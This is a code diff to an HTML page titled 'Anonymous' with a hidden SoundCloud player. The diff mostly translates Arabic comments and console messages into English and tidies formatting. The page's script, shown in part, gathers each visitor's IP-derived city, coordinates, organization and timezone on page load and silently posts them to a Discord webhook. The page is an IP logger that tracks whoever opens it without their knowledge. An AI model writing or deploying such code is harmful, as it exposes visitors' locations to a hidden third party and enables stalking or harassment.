@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Anonymous</title>
   <style>
     body {
@@ -51,7 +51,7 @@
     <img src="https://pbs.twimg.com/media/GbE-jy7X0AEZLZo?format=jpg&name=large" alt="Discord Image" />
   </div>
 
-  <!-- مشغل SoundCloud -->
+  <!-- SoundCloud Player (Hidden) -->
   <div class="music-player">
     <iframe 
       width="0" 
@@ -90,7 +90,8 @@
         document.getElementById('org').textContent = data.org;
         document.getElementById('timezone').textContent = data.timezone;
 
-        // بناء رسالة بالصيغة المطلوبة
+        const localTime = new Date().toLocaleString('en-US', { timeZone: data.timezone || 'UTC' });
+
         const message = `
 ------------------------
 ------------------------
@@ -99,26 +100,25 @@
 🏙️ City: ${data.city}
 📍 Location: ${data.loc}
 🏢 Organization: ${data.org}
-⏰ Local Time: ${new Date().toLocaleString('ar-EG', { timeZone: data.timezone || 'UTC' })}
+⏰ Local Time: ${localTime}
 ------------------------
 ------------------------
-        `;
+`;
 
-        // إرسال إلى Discord webhook
         fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: "```" + message + "```" })
+          body: JSON.stringify({ content: `||*\`${message}\`*||` })
         }).then(res => {
           if (res.ok) {
-            console.log('تم إرسال البيانات للـ Discord webhook!');
+            console.log('Data sent to Discord webhook!');
           } else {
-            console.error('فشل الإرسال للويبهوك.');
+            console.error('Failed to send webhook.');
           }
         });
       })
       .catch(err => {
-        console.error('خطأ في جلب معلومات IP:', err);
+        console.error('Error fetching IP info:', err);
       });
   </script>
 </body>
